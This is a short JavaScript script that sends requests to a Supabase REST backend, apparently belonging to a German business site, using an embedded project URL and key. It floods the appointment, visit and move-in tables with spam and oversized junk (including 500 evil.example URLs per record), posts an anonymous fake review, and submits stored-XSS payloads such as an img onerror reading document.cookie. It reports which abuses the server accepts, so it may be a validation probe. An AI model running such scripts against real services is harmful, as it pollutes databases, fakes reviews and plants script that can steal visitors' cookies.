const U='https://jthmekehipiolsxtjavb.supabase.co',K='sb_publishable__YUQh9Vgtda2nPwyxn-hTw_oMXZDe5-';
const post=async(t,b)=>{const r=await fetch(U+'/rest/v1/'+t,{method:'POST',headers:{apikey:K,'Content-Type':'application/json'},body:JSON.stringify(b)});return r.status};
(async()=>{let ok=0;for(let i=0;i<30;i++)if((await post('termine',{name:'SPAMTEST'+i,telefon:'1',nachricht:'x'.repeat(8000)}))<300)ok++;console.log('termine spam accepted',ok+'/30 (8 KB each)');
ok=0;for(let i=0;i<20;i++)if((await post('visits',{path:'x'.repeat(100000)}))<300)ok++;console.log('visits 100KB path accepted',ok+'/20');
ok=0;for(let i=0;i<10;i++)if((await post('neubezug',{name:'SPAMTEST',fotos:Array(500).fill('http://evil.example/'+'a'.repeat(200))}))<300)ok++;console.log('neubezug junk accepted',ok+'/10');
const rv=await post('reviews',{product_id:1,name:'x',sterne:5,text:'y'});console.log('anon review',rv);
console.log('xss in termine nachricht', await post('termine',{name:'<img src=x onerror=alert(document.cookie)>',telefon:'1',nachricht:'<script>alert(1)</script>'}))})()
